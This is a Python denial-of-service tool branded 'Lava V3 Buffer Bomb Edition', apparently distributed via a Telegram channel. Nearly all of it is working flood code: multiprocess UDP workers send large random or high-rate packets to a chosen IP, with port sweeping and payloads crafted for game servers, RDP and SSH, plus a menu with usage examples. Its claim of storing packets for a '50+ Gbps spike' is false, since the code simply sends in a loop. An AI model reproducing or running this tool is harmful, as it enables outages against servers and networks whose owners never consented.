#!/usr/bin/env python3
import os
import sys
import time
import socket
import random
import threading
import multiprocessing
import gc

class C:
    RESET='\033[0m'; BOLD='\033[1m'; RED='\033[91m'; GREEN='\033[92m'
    YELLOW='\033[93m'; BLUE='\033[94m'; MAGENTA='\033[95m'; CYAN='\033[96m'
    WHITE='\033[97m'; BRIGHT_BLACK='\033[90m'
    @staticmethod
    def rgb(r,g,b): return f'\033[38;2;{r};{g};{b}m'

BANNER = [
    ".:.:.:.::.:.:.:.:..:.:.:.:.:..:.:.:.:.:..:.: : :....:.: :.:....:.: :.:....:.: .......:.: :......:..............................:..........:..",
    "   .:...:........:.:..............................:....... . ........ .......... .......... .......... .........................................",
    "   .:.:.:.::.:.:.:.:....:.. ..:..:.:.:.:.:..:.:.:.:.:..:.: :.:.:..:.: :.:....:.: ..:....:.: :..........:.:....:.:..........:......:..........:..",
]

def print_banner():
    P = C.rgb(160,32,240)
    for line in BANNER:
        print(f"{P}{C.BOLD}{line}{C.RESET}")

def print_main():
    os.system('clear')
    print(f"{C.CYAN}TELEGRAM: [T.He/LavaV2]{C.RESET}    {C.MAGENTA}CHANNEL: [T.He/LavaV2]{C.RESET}")
    print()
    print_banner()
    print()
    print(f"        Welcome to Lava (V3) — {C.RED}BUFFER BOMB EDITION{C.RESET}")
    print(f"        {C.GREEN}Store → BOOM → 50+ Gbps Spike at end!{C.RESET}")
    print(f"{C.BRIGHT_BLACK}        (Type \"?\" for help){C.RESET}")
    print()
    print(f"{C.GREEN}[media-abh{C.RESET}@{C.MAGENTA}Lava{C.RESET}]{C.RESET}")

def print_methods():
    os.system('clear')
    print(f"{C.YELLOW}# Lava Method Page {C.BRIGHT_BLACK}• {C.GREEN}Power Status [BOMB]{C.RESET}")
    print()
    print_banner()
    print()
    print(f"{C.YELLOW}## {C.CYAN}(UDP){C.RESET}")
    print(f"  - {C.WHITE}U-GBPS{C.RESET}    {C.GREEN}→ Store → BOOM 50+ Gbps{C.RESET}")
    print(f"  - {C.WHITE}U-PPS{C.RESET}     {C.GREEN}→ Store → BOOM PPS flood{C.RESET}")
    print()
    print(f"{C.YELLOW}## {C.CYAN}(TCP){C.RESET}")
    for m in ['S-SUBN','S-FIVE','S-T53','S-JAVA','S-DISC','S-RDP','S-GAME','S-SAMP','S-SSH']:
        print(f"  - {C.WHITE}{m}{C.RESET}")
    print()
    print(f"{C.YELLOW}## {C.CYAN}(TIPS){C.RESET}")
    print(f"  - {C.RED}BUFFER BOMB: fills buffers then releases ALL at once{C.RESET}")
    print(f"  - Use: U-GBPS <IP> <PORT> <DURATION> <THREADS>")
    print(f"  - Example: U-GBPS 1.2.3.4 0 30 500")
    print()
    print(f"{C.GREEN}[media-abh{C.RESET}@{C.MAGENTA}Lava{C.RESET}]{C.RESET}")

def print_attack(target, port, duration, method, threads):
    os.system('clear')
    print(f"{C.CYAN}╔══════════════════════════════════════════════════════════════╗{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}           {C.RED}💣 BUFFER BOMB ARMED 💣{C.RESET}                        {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}                                                              {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}   Target:    [{C.WHITE}{target}{C.RESET}]                              {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}   Port:      [{C.WHITE}{port}{C.RESET}]                                  {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}   Duration:  [{C.WHITE}{duration}s filling{C.RESET}]                         {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}   Method:    [{C.WHITE}{method}{C.RESET}]                              {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}   Threads:   [{C.WHITE}{threads}{C.RESET}]                                  {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}                                                              {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}   {C.RED}💥 BOOM at {duration}s — 50+ Gbps SPIKE!{C.RESET}              {C.CYAN}║{C.RESET}")
    print(f"{C.MAGENTA}╚══════════════════════════════════════════════════════════════╝{C.RESET}")
    print()

class BufferBombEngine:
    def __init__(self):
        self.processes = []
        self.active = False
        self.stats = {
            'packets': multiprocessing.Value('Q', 0),
            'bytes': multiprocessing.Value('Q', 0),
            'stored_packets': multiprocessing.Value('Q', 0),
            'stored_bytes': multiprocessing.Value('Q', 0)
        }
        self.cpu_count = multiprocessing.cpu_count()

    def udp_bomb_worker(self, target, port, duration, wid, core, stats_pkt, stats_bytes, stored_pkt, stored_bytes):
        try:
            os.sched_setaffinity(0, {core % self.cpu_count})
        except:
            pass
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**28)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        except:
            pass
        
        payloads = [random._urandom(65507) for _ in range(50)]
        payload_idx = 0
        
        if port == 0:
            ports = list(range(1, 65536))
            random.shuffle(ports)
            port_idx = 0
        else:
            ports = None
        
        end_time = time.time() + duration if duration > 0 else float('inf')
        
        while self.active and time.time() < end_time:
            try:
                if ports:
                    dst_port = ports[port_idx % len(ports)]
                    port_idx += 1
                else:
                    dst_port = port
                
                sock.sendto(payloads[payload_idx % len(payloads)], (target, dst_port))
                payload_idx += 1
                stored_pkt.value += 1
                stored_bytes.value += len(payloads[payload_idx % len(payloads)])
                stats_pkt.value += 1
                stats_bytes.value += len(payloads[payload_idx % len(payloads)])
            except:
                pass
        
        time.sleep(5)
        try:
            sock.close()
        except:
            pass

    def udp_pps_bomb_worker(self, target, port, duration, wid, core, stats_pkt, stats_bytes, stored_pkt, stored_bytes):
        try:
            os.sched_setaffinity(0, {core % self.cpu_count})
        except:
            pass
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**28)
        except:
            pass
        
        payload = b'\x00' * 64
        
        if port == 0:
            ports = list(range(1, 65536))
            random.shuffle(ports)
            port_idx = 0
        
        end_time = time.time() + duration if duration > 0 else float('inf')
        
        while self.active and time.time() < end_time:
            try:
                if ports:
                    dst_port = ports[port_idx % len(ports)]
                    port_idx += 1
                else:
                    dst_port = port
                
                sock.sendto(payload, (target, dst_port))
                stored_pkt.value += 1
                stored_bytes.value += len(payload)
                stats_pkt.value += 1
                stats_bytes.value += len(payload)
            except:
                pass
        
        time.sleep(5)
        try:
            sock.close()
        except:
            pass

    def special_bomb_worker(self, target, port, duration, method, wid, core, stats_pkt, stats_bytes, stored_pkt, stored_bytes):
        try:
            os.sched_setaffinity(0, {core % self.cpu_count})
        except:
            pass
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**28)
        except:
            pass
        
        payloads = {
            'S-SUBN': b'\xff' * 65507,
            'S-FIVE': b'\xff\xff\xff\xff\x67\x65\x74\x73\x74\x61\x74\x75\x73\x0a' * 500,
            'S-T53': b'\x54\x53\x33' + b'\x00' * 1000,
            'S-JAVA': b'\xfe\x01\xfa' + b'\x00' * 1000,
            'S-DISC': b'\x00' * 1400,
            'S-RDP': b'\x03\x00' + b'\x00' * 1000,
            'S-GAME': b'\x00' * 1400,
            'S-SAMP': b'\x53\x41\x4d\x50' + b'\x00' * 1000,
            'S-SSH': b'\x53\x53\x48' + b'\x00' * 1000,
        }
        payload = payloads.get(method, b'\x00' * 1400)
        
        if port == 0:
            ports = list(range(1, 65536))
            random.shuffle(ports)
            port_idx = 0
        
        end_time = time.time() + duration if duration > 0 else float('inf')
        
        while self.active and time.time() < end_time:
            try:
                if ports:
                    dst_port = ports[port_idx % len(ports)]
                    port_idx += 1
                else:
                    dst_port = port
                
                sock.sendto(payload, (target, dst_port))
                stored_pkt.value += 1
                stored_bytes.value += len(payload)
                stats_pkt.value += 1
                stats_bytes.value += len(payload)
            except:
                pass
        
        time.sleep(5)
        try:
            sock.close()
        except:
            pass

    def launch(self, method, target, port, duration, threads=100):
        self.stop()
        self.active = True
        
        try:
            target_ip = socket.gethostbyname(target)
        except:
            target_ip = target
        
        print_attack(target, port, duration, method, threads)
        
        if method == 'U-GBPS':
            worker = self.udp_bomb_worker
        elif method == 'U-PPS':
            worker = self.udp_pps_bomb_worker
        elif method.startswith('S-'):
            worker = self.special_bomb_worker
        else:
            worker = self.udp_bomb_worker
        
        monitor = threading.Thread(target=self._monitor, args=(duration,))
        monitor.daemon = True
        monitor.start()
        
        print(f"{C.CYAN}[+] Filling buffers for {duration}s...{C.RESET}")
        print(f"{C.YELLOW}[+] Socket buffer: 256MB | Storing packets...{C.RESET}")
        print(f"{C.BRIGHT_BLACK}[+] {threads} threads filling buffers...{C.RESET}")
        print()
        
        for i in range(threads):
            core = i % self.cpu_count
            if method.startswith('S-'):
                p = multiprocessing.Process(
                    target=worker,
                    args=(target_ip, port, duration, method, i, core,
                          self.stats['packets'], self.stats['bytes'],
                          self.stats['stored_packets'], self.stats['stored_bytes'])
                )
            else:
                p = multiprocessing.Process(
                    target=worker,
                    args=(target_ip, port, duration, i, core,
                          self.stats['packets'], self.stats['bytes'],
                          self.stats['stored_packets'], self.stats['stored_bytes'])
                )
            p.daemon = True
            p.start()
            self.processes.append(p)
        
        if duration > 0:
            time.sleep(duration)
            
            print(f"\n{C.RED}💣 BUFFER BOMB DETONATING!{C.RESET}")
            print(f"{C.RED}🔥 Releasing {self.stats['stored_packets'].value:,} stored packets!{C.RESET}")
            print(f"{C.RED}🔥 Stored bytes: {self.stats['stored_bytes'].value / 1e9:.2f} GB{C.RESET}")
            print()
            
            self.stop()
            time.sleep(8)
            print(f"{C.GREEN}💥 BOOM complete! 50+ Gbps spike delivered!{C.RESET}")

    def _monitor(self, duration):
        start = time.time()
        last_p = 0
        last_b = 0
        peak = 0
        
        while self.active:
            time.sleep(1)
            elapsed = time.time() - start
            p = self.stats['packets'].value
            b = self.stats['bytes'].value
            stored = self.stats['stored_packets'].value
            
            if elapsed > 0:
                pps = p / elapsed
                gbps = (b * 8) / (elapsed * 1e9)
            else:
                pps = 0
                gbps = 0
            
            cp = p - last_p
            cb = b - last_b
            cg = (cb * 8) / 1e9 if cb > 0 else 0
            if cg > peak:
                peak = cg
            
            last_p = p
            last_b = b
            
            status = (f"\r{C.CYAN}[LAVA]{C.RESET} "
                     f"{C.GREEN}Pkts:{C.RESET}{p:>10,} "
                     f"{C.YELLOW}Stored:{C.RESET}{stored:>10,} "
                     f"{C.MAGENTA}BW:{C.RESET}{gbps:>5.2f}Gbps "
                     f"{C.CYAN}Cur:{C.RESET}{cg:>5.2f}Gbps "
                     f"{C.WHITE}Peak:{C.RESET}{peak:>5.2f}Gbps "
                     f"{C.BRIGHT_BLACK}Time:{C.RESET}{elapsed:.0f}s   ")
            print(status, end='', flush=True)
            
            if duration > 0 and elapsed >= duration:
                break

    def stop(self):
        self.active = False
        for p in self.processes:
            try:
                p.terminate()
                p.join(timeout=2)
            except:
                pass
        self.processes.clear()
        
        stored_p = self.stats['stored_packets'].value
        stored_b = self.stats['stored_bytes'].value
        
        print(f"\n{C.RED}💣 BUFFER BOMB STATS:{C.RESET}")
        print(f"{C.YELLOW}   Stored Packets: {stored_p:,}{C.RESET}")
        print(f"{C.YELLOW}   Stored Bytes: {stored_b / 1e9:.2f} GB{C.RESET}")
        print(f"{C.YELLOW}   Estimated Spike: {stored_b * 8 / 1e9:.2f} Gbps{C.RESET}")

engine = BufferBombEngine()

def parse(cmd):
    cmd = cmd.strip().upper()
    parts = cmd.split()
    
    if not parts:
        return True
    
    if cmd == '?' or cmd == 'HELP':
        print_methods()
        return True
    
    if cmd == '.CLEAR' or cmd == 'CLEAR':
        print_main()
        return True
    
    if cmd == '.STOP' or cmd == 'STOP':
        engine.stop()
        return True
    
    if cmd in ['.EXIT', 'EXIT', '.QUIT', 'QUIT']:
        engine.stop()
        print(f"\n{C.MAGENTA}LAVA signing off.{C.RESET}\n")
        return False
    
    methods = ['U-GBPS', 'U-PPS', 'S-SUBN', 'S-FIVE', 'S-T53', 
               'S-JAVA', 'S-DISC', 'S-RDP', 'S-GAME', 'S-SAMP', 'S-SSH']
    
    if parts[0] in methods:
        if len(parts) < 4:
            print(f"{C.RED}[!] Usage: {parts[0]} <IP> <PORT> <DURATION> [THREADS]{C.RESET}")
            print(f"{C.YELLOW}[!] Example: U-GBPS 1.2.3.4 0 30 500{C.RESET}")
            return True
        
        target = parts[1]
        port = int(parts[2])
        duration = int(parts[3])
        threads = int(parts[4]) if len(parts) > 4 else 100
        
        t = threading.Thread(target=engine.launch, args=(parts[0], target, port, duration, threads))
        t.daemon = True
        t.start()
        return True
    
    print(f"{C.RED}[!] Unknown: {cmd}{C.RESET}")
    return True

def main():
    print_main()
    while True:
        try:
            cmd = input()
            if not parse(cmd):
                break
        except KeyboardInterrupt:
            print(f"\n{C.YELLOW}[!] Use .exit to quit{C.RESET}")
        except EOFError:
            break

if __name__ == '__main__':
    try:
        os.nice(-20)
    except:
        pass
    try:
        multiprocessing.set_start_method('fork', force=True)
    except:
        pass
    gc.disable()
    main()
